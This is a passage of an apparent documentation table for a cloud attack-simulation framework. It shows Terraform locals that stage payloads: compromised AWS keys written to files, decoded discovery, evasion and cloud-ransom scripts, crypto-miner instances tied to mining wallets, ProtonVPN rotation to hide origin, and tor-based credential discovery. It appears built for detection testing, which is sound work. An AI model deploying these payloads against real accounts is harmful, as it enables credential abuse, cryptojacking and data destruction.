\| gunzip &gt; /$\{local\.attack\_dir\}/aws\-cli/scripts/baseline\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.discovery\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/aws\-cli/scripts/discovery\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.evasion\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/aws\-cli/scripts/evasion\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.cloudransom\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/aws\-cli/scripts/cloudransom\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.cloudcrypto\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/terraform/scripts/cloudcrypto/main\.tf<br/>    echo &\#x27;$\{base64gzip\(local\.terraform\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/terraform/scripts/cloudcrypto/terraform\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.hostcrypto\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/terraform/scripts/hostcrypto/main\.tf<br/>    echo &\#x27;$\{base64gzip\(local\.terraform\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/terraform/scripts/hostcrypto/terraform\.sh<br/>    log &quot;Starting as background job\.\.\.&quot;<br/>    if \[ &quot;$\{var\.inputs\[&quot;protonvpn\_tier&quot;\]\}&quot; == &quot;0&quot; \]; then<br/>        for i in $\(echo &quot;US NL\-FREE\#1 JP\-FREE\#3 NL\-FREE\#4 NL\-FREE\#8 US\-FREE\#5 NL\-FREE\#9 NL\-FREE\#12 NL\-FREE\#13 NL\-FREE\#14 NL\-FREE\#15 NL\-FREE\#16 US\-FREE\#13 US\-FREE\#32 US\-FREE\#33 US\-FREE\#34 NL\-FREE\#39 NL\-FREE\#52 NL\-FREE\#57 NL\-FREE\#87 NL\-FREE\#133 NL\-FREE\#136 NL\-FREE\#148 US\-FREE\#52 US\-FREE\#53 US\-FREE\#54 US\-FREE\#51 NL\-FREE\#163 NL\-FREE\#164 US\-FREE\#58 US\-FREE\#57 US\-FREE\#56 US\-FREE\#55&quot;\); do cp \.env\-protonvpn \.env\-protonvpn\-$i; sed \-i &quot;s/RANDOM/$i/&quot; \.env\-protonvpn\-$i; done<br/>        /bin/bash auto\-free\.sh<br/>    else<br/>        for i in $\(echo &quot;AU CR IS JP LV NL NZ SG SK US&quot;\); do cp \.env\-protonvpn\-paid \.env\-protonvpn\-paid\-$i; sed \-i &quot;s/RANDOM/$i/&quot; \.env\-protonvpn\-paid\-$i; done<br/>        /bin/bash auto\-paid\.sh<br/>    fi;<br/>    log &quot;Done\.&quot;<br/>    EOT<br/><br/>    protonvpn       = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/protonvpn\.env\.tpl&quot;, <br/>                                \{<br/>                                    protonvpn\_user = var\.inputs\[&quot;protonvpn\_user&quot;\]<br/>                                    protonvpn\_password = var\.inputs\[&quot;protonvpn\_password&quot;\]<br/>                                    protonvpn\_server = var\.inputs\[&quot;protonvpn\_server&quot;\]<br/>                                    protonvpn\_tier = tostring\(var\.inputs\[&quot;protonvpn\_tier&quot;\]\)<br/>                                    protonvpn\_protocol = var\.inputs\[&quot;protonvpn\_protocol&quot;\]<br/>                                    protonvpn\_privatekey = try\(length\(var\.inputs\[&quot;protonvpn\_privatekey&quot;\]\), &quot;false&quot;\) \!= &quot;false&quot; ? var\.inputs\[&quot;protonvpn\_privatekey&quot;\] : &quot;&quot;<br/>                                \}<br/>                            \)<br/>    protonvpn\-paid       = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/protonvpn\.env\.tpl&quot;, <br/>                                \{<br/>                                    protonvpn\_user = var\.inputs\[&quot;protonvpn\_user&quot;\]<br/>                                    protonvpn\_password = var\.inputs\[&quot;protonvpn\_password&quot;\]<br/>                                    protonvpn\_server = var\.inputs\[&quot;protonvpn\_server&quot;\]<br/>                                    protonvpn\_tier = 2<br/>                                    protonvpn\_protocol = var\.inputs\[&quot;protonvpn\_protocol&quot;\]<br/>                                    protonvpn\_privatekey = try\(length\(var\.inputs\[&quot;protonvpn\_privatekey&quot;\]\), &quot;false&quot;\) \!= &quot;false&quot; ? var\.inputs\[&quot;protonvpn\_privatekey&quot;\] : &quot;&quot;<br/>                                \}<br/>                            \)<br/>    protonvpn\-baseline  = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/protonvpn\.env\.tpl&quot;, <br/>                                \{<br/>                                    protonvpn\_user = var\.inputs\[&quot;protonvpn\_user&quot;\]<br/>                                    protonvpn\_password = var\.inputs\[&quot;protonvpn\_password&quot;\]<br/>                                    protonvpn\_server = &quot;US&quot;<br/>                                    protonvpn\_tier = tostring\(var\.inputs\[&quot;protonvpn\_tier&quot;\]\)<br/>                                    protonvpn\_protocol = var\.inputs\[&quot;protonvpn\_protocol&quot;\]<br/>                                    protonvpn\_privatekey = try\(length\(var\.inputs\[&quot;protonvpn\_privatekey&quot;\]\), &quot;false&quot;\) \!= &quot;false&quot; ? var\.inputs\[&quot;protonvpn\_privatekey&quot;\] : &quot;&quot;<br/>                                \}<br/>                            \)<br/>    auto\-free   = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/auto\-free\.sh\.tpl&quot;,<br/>                                \{<br/>                                    compromised\_keys\_user = var\.inputs\[&quot;compromised\_keys\_user&quot;\]<br/>                                    script = local\.script<br/>                                    script\_type = local\.script\_type<br/>                                    attack\_type = local\.attack\_type<br/>                                    attack\_delay = var\.inputs\[&quot;attack\_delay&quot;\]<br/>                                \}<br/>                            \)<br/>    auto\-paid   = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/auto\-paid\.sh\.tpl&quot;,<br/>                                \{<br/>                                    compromised\_keys\_user = var\.inputs\[&quot;compromised\_keys\_user&quot;\]<br/>                                    script = local\.script<br/>                                    script\_type = local\.script\_type<br/>                                    attack\_type = local\.attack\_type<br/>                                    attack\_delay = var\.inputs\[&quot;attack\_delay&quot;\]<br/>                                \}<br/>                            \)<br/>    baseline    = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/baseline\.sh\.tpl&quot;,<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    discovery   = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/discovery\.sh\.tpl&quot;,<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    evasion     = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/evasion\.sh\.tpl&quot;,<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    cloudransom = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/cloudransom\.sh\.tpl&quot;,<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    cloudcrypto = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/cloudcrypto\.tf\.tpl&quot;,<br/>                                \{<br/>                                    name = &quot;crypto\-gpu\-miner\-$\{var\.inputs\[&quot;environment&quot;\]\}\-$\{var\.inputs\[&quot;deployment&quot;\]\}&quot;<br/>                                    instances = 12<br/>                                    wallet = var\.inputs\[&quot;ethermine\_wallet&quot;\]<br/>                                    region = var\.inputs\[&quot;region&quot;\]<br/>                                \}<br/>                            \)<br/>    hostcrypto  = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/hostcrypto\.tf\.tpl&quot;,<br/>                                \{<br/>                                    name = &quot;host\-cpu\-miner\-$\{var\.inputs\[&quot;environment&quot;\]\}\-$\{var\.inputs\[&quot;deployment&quot;\]\}&quot;<br/>                                    region = var\.inputs\[&quot;region&quot;\]<br/>                                    instances = 1<br/>                                    minergate\_user = var\.inputs\[&quot;minergate\_user&quot;\]<br/>                                    nicehash\_user = var\.inputs\[&quot;nicehash\_user&quot;\]<br/>                                \}<br/>                            \)<br/>    <br/>    terraform  = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/terraform\.sh\.tpl&quot;,<br/>                                \{<br/>                                \}<br/>                            \)<br/>    <br/>    start       = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/start\.sh\.tpl&quot;,<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/><br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_auto\-free\.sh&quot;<br/>                content = base64encode\(local\.auto\-free\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_auto\-paid\.sh&quot;<br/>                content = base64encode\(local\.auto\-paid\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_baseline\.sh&quot;<br/>                content = base64encode\(local\.baseline\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_discovery\.sh&quot;<br/>                content = base64encode\(local\.discovery\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_evasion\.sh&quot;<br/>                content = base64encode\(local\.evasion\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_cloudransom\.sh&quot;<br/>                content = base64encode\(local\.cloudransom\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_terraform\.sh&quot;<br/>                content = base64encode\(local\.terraform\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_start\.sh&quot;<br/>                content = base64encode\(local\.start\)<br/>            \}<br/>        \]<br/>    \}<br/>\}</pre>          |
| attacker-simulation-attacker-exec-docker-composite-defense-evasion         | ./modules/ssm/execute-docker-composite-defense-evasion         | ssm_exec_docker_defense_evasion            | context.aws.ssm.attacker.execute.docker_composite_defense_evasion         | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "docker_composite_defense_evasion": {<br/>                            "attack_delay": 50400,<br/>                            "compromised_credentials": {},<br/>                            "compromised_keys_user": null,<br/>                            "enabled": false,<br/>                            "minergate_user": null,<br/>                            "nicehash_user": null,<br/>                            "protonvpn_password": null,<br/>                            "protonvpn_privatekey": null,<br/>                            "protonvpn_protocol": "udp",<br/>                            "protonvpn_server": "RANDOM",<br/>                            "protonvpn_tier": 0,<br/>                            "protonvpn_user": null,<br/>                            "wallet": null<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-composite-defense-evasion         | <pre>locals \{<br/>    attack\_dir = &quot;/cloud\-tunnel&quot;<br/>    script = &quot;evasion\.sh&quot;<br/>    script\_type = &quot;aws\-cli&quot;<br/>    attack\_type = &quot;defense\_evasion&quot;<br/>    aws\_creds = join\(&quot;\\n&quot;, \[ for u,k in var\.inputs\[&quot;compromised\_credentials&quot;\]: &quot;echo &\#x27;$\{k\.rendered\}&\#x27; &gt; $\{local\.attack\_dir\}/\.env\-aws\-$\{u\}&quot; \]\)<br/>    payload = &lt;&lt;\-EOT<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    mkdir \-p $\{local\.attack\_dir\} $\{local\.attack\_dir\}/aws\-cli/scripts $\{local\.attack\_dir\}/terraform/scripts/cloudcrypto $\{local\.attack\_dir\}/terraform/scripts/hostcrypto $\{local\.attack\_dir\}/protonvpn<br/>    cd $\{local\.attack\_dir\}<br/>    $\{local\.aws\_creds\}<br/>    echo &\#x27;$\{base64gzip\(local\.start\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/start\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.auto\-free\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/auto\-free\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.auto\-paid\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/auto\-paid\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.protonvpn\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/\.env\-protonvpn<br/>    echo &\#x27;$\{base64gzip\(local\.protonvpn\-paid\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/\.env\-protonvpn\-paid<br/>    echo &\#x27;$\{base64gzip\(local\.protonvpn\-baseline\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/\.env\-protonvpn\-baseline<br/>    echo &\#x27;$\{base64gzip\(local\.baseline\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/aws\-cli/scripts/baseline\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.discovery\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/aws\-cli/scripts/discovery\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.evasion\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/aws\-cli/scripts/evasion\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.cloudransom\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/aws\-cli/scripts/cloudransom\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.cloudcrypto\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/terraform/scripts/cloudcrypto/main\.tf<br/>    echo &\#x27;$\{base64gzip\(local\.terraform\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/terraform/scripts/cloudcrypto/terraform\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.hostcrypto\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/terraform/scripts/hostcrypto/main\.tf<br/>    echo &\#x27;$\{base64gzip\(local\.terraform\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/terraform/scripts/hostcrypto/terraform\.sh<br/>    log &quot;Starting as background job\.\.\.&quot;<br/>    if \[ &quot;$\{var\.inputs\[&quot;protonvpn\_tier&quot;\]\}&quot; == &quot;0&quot; \]; then<br/>        for i in $\(echo &quot;US NL\-FREE\#1 JP\-FREE\#3 NL\-FREE\#4 NL\-FREE\#8 US\-FREE\#5 NL\-FREE\#9 NL\-FREE\#12 NL\-FREE\#13 NL\-FREE\#14 NL\-FREE\#15 NL\-FREE\#16 US\-FREE\#13 US\-FREE\#32 US\-FREE\#33 US\-FREE\#34 NL\-FREE\#39 NL\-FREE\#52 NL\-FREE\#57 NL\-FREE\#87 NL\-FREE\#133 NL\-FREE\#136 NL\-FREE\#148 US\-FREE\#52 US\-FREE\#53 US\-FREE\#54 US\-FREE\#51 NL\-FREE\#163 NL\-FREE\#164 US\-FREE\#58 US\-FREE\#57 US\-FREE\#56 US\-FREE\#55&quot;\); do cp \.env\-protonvpn \.env\-protonvpn\-$i; sed \-i &quot;s/RANDOM/$i/&quot; \.env\-protonvpn\-$i; done<br/>        /bin/bash auto\-free\.sh<br/>    else<br/>        for i in $\(echo &quot;AU CR IS JP LV NL NZ SG SK US&quot;\); do cp \.env\-protonvpn\-paid \.env\-protonvpn\-paid\-$i; sed \-i &quot;s/RANDOM/$i/&quot; \.env\-protonvpn\-paid\-$i; done<br/>        /bin/bash auto\-paid\.sh<br/>    fi;<br/>    log &quot;Done\.&quot;<br/>    EOT<br/><br/>    protonvpn       = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/protonvpn\.env\.tpl&quot;, <br/>                                \{<br/>                                    protonvpn\_user = var\.inputs\[&quot;protonvpn\_user&quot;\]<br/>                                    protonvpn\_password = var\.inputs\[&quot;protonvpn\_password&quot;\]<br/>                                    protonvpn\_server = var\.inputs\[&quot;protonvpn\_server&quot;\]<br/>                                    protonvpn\_tier = tostring\(var\.inputs\[&quot;protonvpn\_tier&quot;\]\)<br/>                                    protonvpn\_protocol = var\.inputs\[&quot;protonvpn\_protocol&quot;\]<br/>                                    protonvpn\_privatekey = try\(length\(var\.inputs\[&quot;protonvpn\_privatekey&quot;\]\), &quot;false&quot;\) \!= &quot;false&quot; ? var\.inputs\[&quot;protonvpn\_privatekey&quot;\] : &quot;&quot;<br/>                                \}<br/>                            \)<br/>    protonvpn\-paid       = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/protonvpn\.env\.tpl&quot;, <br/>                                \{<br/>                                    protonvpn\_user = var\.inputs\[&quot;protonvpn\_user&quot;\]<br/>                                    protonvpn\_password = var\.inputs\[&quot;protonvpn\_password&quot;\]<br/>                                    protonvpn\_server = var\.inputs\[&quot;protonvpn\_server&quot;\]<br/>                                    protonvpn\_tier = 2<br/>                                    protonvpn\_protocol = var\.inputs\[&quot;protonvpn\_protocol&quot;\]<br/>                                    protonvpn\_privatekey = try\(length\(var\.inputs\[&quot;protonvpn\_privatekey&quot;\]\), &quot;false&quot;\) \!= &quot;false&quot; ? var\.inputs\[&quot;protonvpn\_privatekey&quot;\] : &quot;&quot;<br/>                                \}<br/>                            \)<br/>    protonvpn\-baseline  = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/protonvpn\.env\.tpl&quot;, <br/>                                \{<br/>                                    protonvpn\_user = var\.inputs\[&quot;protonvpn\_user&quot;\]<br/>                                    protonvpn\_password = var\.inputs\[&quot;protonvpn\_password&quot;\]<br/>                                    protonvpn\_server = &quot;US&quot;<br/>                                    protonvpn\_tier = tostring\(var\.inputs\[&quot;protonvpn\_tier&quot;\]\)<br/>                                    protonvpn\_protocol = var\.inputs\[&quot;protonvpn\_protocol&quot;\]<br/>                                    protonvpn\_privatekey = try\(length\(var\.inputs\[&quot;protonvpn\_privatekey&quot;\]\), &quot;false&quot;\) \!= &quot;false&quot; ? var\.inputs\[&quot;protonvpn\_privatekey&quot;\] : &quot;&quot;<br/>                                \}<br/>                            \)<br/>    auto\-free   = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/auto\-free\.sh\.tpl&quot;,<br/>                                \{<br/>                                    compromised\_keys\_user = var\.inputs\[&quot;compromised\_keys\_user&quot;\]<br/>                                    script = local\.script<br/>                                    script\_type = local\.script\_type<br/>                                    attack\_type = local\.attack\_type<br/>                                    attack\_delay = var\.inputs\[&quot;attack\_delay&quot;\]<br/>                                \}<br/>                            \)<br/>    auto\-paid   = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/auto\-paid\.sh\.tpl&quot;,<br/>                                \{<br/>                                    compromised\_keys\_user = var\.inputs\[&quot;compromised\_keys\_user&quot;\]<br/>                                    script = local\.script<br/>                                    script\_type = local\.script\_type<br/>                                    attack\_type = local\.attack\_type<br/>                                    attack\_delay = var\.inputs\[&quot;attack\_delay&quot;\]<br/>                                \}<br/>                            \)<br/>    baseline    = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/baseline\.sh\.tpl&quot;,<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    discovery   = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/discovery\.sh\.tpl&quot;,<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    evasion     = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/evasion\.sh\.tpl&quot;,<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    cloudransom = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/cloudransom\.sh\.tpl&quot;,<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    cloudcrypto = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/cloudcrypto\.tf\.tpl&quot;,<br/>                                \{<br/>                                    name = &quot;crypto\-gpu\-miner\-$\{var\.inputs\[&quot;environment&quot;\]\}\-$\{var\.inputs\[&quot;deployment&quot;\]\}&quot;<br/>                                    instances = 12<br/>                                    wallet = var\.inputs\[&quot;ethermine\_wallet&quot;\]<br/>                                    region = var\.inputs\[&quot;region&quot;\]<br/>                                \}<br/>                            \)<br/>    hostcrypto  = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/hostcrypto\.tf\.tpl&quot;,<br/>                                \{<br/>                                    name = &quot;host\-cpu\-miner\-$\{var\.inputs\[&quot;environment&quot;\]\}\-$\{var\.inputs\[&quot;deployment&quot;\]\}&quot;<br/>                                    region = var\.inputs\[&quot;region&quot;\]<br/>                                    instances = 1<br/>                                    minergate\_user = var\.inputs\[&quot;minergate\_user&quot;\]<br/>                                    nicehash\_user = var\.inputs\[&quot;nicehash\_user&quot;\]<br/>                                \}<br/>                            \)<br/>    <br/>    terraform  = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/terraform\.sh\.tpl&quot;,<br/>                                \{<br/>                                \}<br/>                            \)<br/>    <br/>    start       = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/start\.sh\.tpl&quot;,<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/><br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        apt\_packages = &quot;git&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        yum\_packages = &quot;git&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_auto\-free\.sh&quot;<br/>                content = base64encode\(local\.auto\-free\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_auto\-paid\.sh&quot;<br/>                content = base64encode\(local\.auto\-paid\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_baseline\.sh&quot;<br/>                content = base64encode\(local\.baseline\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_discovery\.sh&quot;<br/>                content = base64encode\(local\.discovery\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_evasion\.sh&quot;<br/>                content = base64encode\(local\.evasion\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_cloudransom\.sh&quot;<br/>                content = base64encode\(local\.cloudransom\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_terraform\.sh&quot;<br/>                content = base64encode\(local\.terraform\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_start\.sh&quot;<br/>                content = base64encode\(local\.start\)<br/>            \}<br/>        \]<br/>    \}<br/>\}</pre>         |
| attacker-ssm-execute-docker-composite-guardduty                            | ./modules/ssm/execute-docker-composite-guardduty               | ssm_exec_docker_guardduty                  | context.aws.ssm.attacker.execute.docker_composite_guardduty               | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "docker_composite_guardduty": {<br/>                            "attack_delay": 50400,<br/>                            "enabled": false<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-composite-guardduty               | <pre>locals \{<br/>    attack\_dir = &quot;/guardduty&quot;<br/>    attack\_script = &quot;discovery\_aws\_instance\_creds\_tor\.sh&quot;<br/>    start\_script = &quot;discovery\_delayed\_start\.sh&quot;<br/>    payload = &lt;&lt;\-EOT<br/>    log &quot;removing previous app directory&quot;<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    log &quot;creating app directory&quot;<br/>    mkdir \-p $\{local\.attack\_dir\}<br/>    cd $\{local\.attack\_dir\}<br/>    echo $\{base64gzip\(local\.discovery\)\} \| base64 \-d \| gunzip &gt; $\{local\.attack\_script\}<br/>    echo $\{base64gzip\(local\.start\)\} \| base64 \-d \| gunzip &gt; $\{local\.start\_script\}<br/>    log &quot;starting script\.\.\.&quot;<br/>    /bin/bash $\{local\.start\_script\}<br/>    <br/>    log &quot;done\.&quot;<br/>    EOT<br/><br/>    discovery       = file\(<br/>                                &quot;$\{path\.module\}/resources/$\{local\.attack\_script\}&quot;, <br/>                            \)<br/>    start           = templatefile\(<br/>                                &quot;$\{path\.module\}/resources/$\{local\.start\_script\}&quot;,<br/>                                \{<br/>                                    attack\_delay = var\.inputs\[&quot;attack\_delay&quot;\]<br/>                                    attack\_dir = local\.attack\_dir<br/>                                    attack\_script = local\.attack\_script<br/>                                \} <br/>                            \)<br/><br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  